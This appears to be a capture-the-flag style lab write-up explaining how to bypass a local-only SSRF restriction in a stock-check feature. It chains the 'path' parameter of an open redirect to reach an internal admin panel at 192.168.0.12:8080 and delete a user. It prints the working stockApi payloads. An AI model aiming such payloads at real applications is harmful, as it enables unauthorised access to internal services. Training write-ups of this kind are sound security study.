## Lab description:

<img width="1379" height="775" alt="Screenshot 2025-11-12 132359" src="https://github.com/user-attachments/assets/78073662-9bc8-4004-835b-28f07507a4cb" />

## Solution:

This lab has a check stock feature with fetches data from internal server

We can use a check stock:

<img width="1896" height="903" alt="Screenshot 2025-11-12 132545" src="https://github.com/user-attachments/assets/65b7ff9e-7d83-46f5-98c7-43ff12e94c2e" />

The server will response:

<img width="1343" height="626" alt="Screenshot 2025-11-12 132601" src="https://github.com/user-attachments/assets/cf40385b-728e-436a-9926-4a6ace977def" />

The stockApi parameter has a value: 
```
stockApi=/product/stock/check?productId=1&storeId=1
```

We know that the stock checker has been restricted to only access the local application, so we can't use the older payload like :
```
stockApi=http://localhost/admin
```

So, we try to open redirect affecting the application:

Now, we need to pay attention that the application has a next product button:

<img width="1905" height="458" alt="Screenshot 2025-11-12 134005" src="https://github.com/user-attachments/assets/00f27126-4d0f-4856-9796-69b6ef86a677" />


We can observe the ```path``` parameter is placed the header of a redirection response:

<img width="1352" height="621" alt="image" src="https://github.com/user-attachments/assets/cdd3fe53-28da-4b87-bde9-9d67ab82ff2f" />

So that, we can use stockApi parameter to open redirect with ```path``` pararmeter:

We try with the payload:
```
stockApi=/product/nextProduct?currentProductId=2&path=/http://192.168.0.12:8080/admin
```

<img width="1350" height="688" alt="image" src="https://github.com/user-attachments/assets/5255d595-88bb-4cf1-9d30-b2b45b7ce4c3" />

But it is still missing 'path' parameter,maybe we can not use 2 parameter in stockApi:

```
stockApi=/product/nextProduct?path=/http://192.168.0.12:8080/admin
```


<img width="1342" height="691" alt="image" src="https://github.com/user-attachments/assets/a4dd3174-8588-402a-9047-6438ad9662cd" />

We successfully accessed the admin control panel and delete user ```carlos```

<img width="1348" height="699" alt="image" src="https://github.com/user-attachments/assets/22ee6113-b7db-43c1-a704-49a19855ced6" />


The lab has been resolved

<img width="1894" height="894" alt="image" src="https://github.com/user-attachments/assets/6ca20090-7e3a-4fca-8ab1-8072f2aa6933" />

